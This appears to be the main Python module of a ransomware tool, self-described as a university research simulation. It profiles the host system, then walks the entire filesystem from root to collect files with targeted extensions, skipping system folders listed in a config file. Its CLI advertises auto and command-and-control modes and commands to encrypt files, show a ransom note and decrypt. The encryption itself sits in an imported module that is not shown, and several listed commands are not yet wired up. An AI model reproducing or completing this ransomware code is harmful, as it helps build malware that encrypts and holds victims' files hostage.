import os
from crypto import CryptoGraphy

class Program():
    def __init__(self, data = None):
        self.__mode__ = "manual"  # default mode
        self.__system__ = "Darwin"  # default system
        self.__criptography: CryptoGraphy = None
        if data is not None:
            pass
        
    def start(self):
        print("This is the ransomware main module.")
        print("What would you like to do?")
        if self.__mode__ == "manual":
            self.__cli()

    def __envcheck(self):
        import platform

        self.__system__ = platform.system()
        print("System:", self.__system__)        # 'Windows', 'Linux', 'Darwin'
        print("Release:", platform.release())
        print("Version:", platform.version())
        print("Machine:", platform.machine())      # 'x86_64', 'arm64'
        print("Processor:", platform.processor())
        print(platform.platform())




        # import sys

        # print("Python Version:", sys.version)
        # print("Executable:", sys.executable)
        # print("Install Prefix:", sys.prefix)



    def __directory(self, start_path="/", skipped_folders=None, targeted_extensions=None):
        import json
        with open("conf.json", "r") as conf_file:
                data = json.load(conf_file)

        if skipped_folders is None:
            general = data.get("skipped_directories_general", [])
            folders = data.get("skipped_directories_" + self.__system__, [])
            skipped_folders = general + folders
            # skipped_folders = ["System", "Volumes", "cores", "etc", "opt", "bin", "sbin", "usr", "private",
            # "dev", "var", "tmp",
            # "Library", "Applications", 
            # "android" , "node_modules", "__pycache__", "venv"
            # ]

        if targeted_extensions is None:
            targeted_extensions = data.get("targeted_extensions", [])
            #targeted_extensions = {".txt", ".doc", ".docx", ".xls", ".xlsx", ".png", ".jpg", ".jpeg", ".pdf"}

        self.__found_files = []
        self.__directories_with_files = []

        for root, dirs, files in os.walk(start_path):
            print(f"Current directory: {root}")
            dirs[:] = [d for d in dirs if d not in skipped_folders and not d.startswith('.') and not d.endswith('.app')]
            files = [f for f in files if any(f.endswith(ext) for ext in targeted_extensions)]
            for d in dirs:
                 print(f"  [DIR]  {os.path.join(root, d)}")

            if files:
                self.__directories_with_files.append(root)

            for f in files:
                self.__found_files.append(os.path.join(root, f))
            #     print(f"  [FILE] {os.path.join(root, f)}")

        print(self.__directories_with_files)
        print(f"Total files found: {len(self.__found_files)}")
        print(f"Total directories with targeted files: {len(self.__directories_with_files)}")

    def __cli(self):
        while True:
            inp = input("MyCLI> ").strip()
            command = inp.split()[0]

            match command:
                case "help":
                    print("Available commands:")
                    print("\thelp - show this help message")
                    print("\tgreet - print a greeting")
                    print("\tinfo - displays information about the ransomware")
                    print("\tchangeMode - changes the mode of operation")
                    print("\t\tDefault mode is 'manual'")
                    print("\t\tAvilable modes: auto, c2, manual")
                    print("\tenvcheck - checks the environment in which the program is running")
                    print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
                    print("\tsetup - sets up the cryptographic configuration")
                    print("\tencrypt - encrypts the discovered files")
                    print("\transomnote - displays the ransom note to the user")
                    print("\tdecrypt - decrypts the previously encrypted files")
                    print("\texit - quit the program")

                case "greet":
                    print("Hello! This is your custom CLI.")

                case "info":
                    print("This code is a ransomware simulation tool made for educational purposes as part of a university research project.")
                    print("It is still able to encrypt files in your system, so be cautious when using it, specially in auto mode")
                
                case "changeMode":
                    print("Mode changed (not really, this is a stub).")
                    if len(inp.split()) > 1 and inp.split()[1] in ["auto", "c2", "manual"]:
                        self.__mode__ = inp.split()[1]
                        print(f"New mode: {self.__mode__}")
                    else:
                        print("Mode not available. Available modes: auto, c2, manual")
                case "envcheck":
                    self.__envcheck()
                case "directory":
#                    self.__directory(os.path.expanduser("~"))
                    self.__directory("/")

                case "setup":
                    self.__criptography = CryptoGraphy(should_encrypt=False, should_delete_original=False)
                    self.__criptography.setup()

                case "loadkey": 
                    self.__criptography.load_key()

                case "exit" | "quit":
                    print("Exiting...")
                    break

                case "":   # empty input
                    pass

                case _:
                    print(f"Unknown command: {command}")



if __name__ == "__main__":
    program = Program()
    program.start()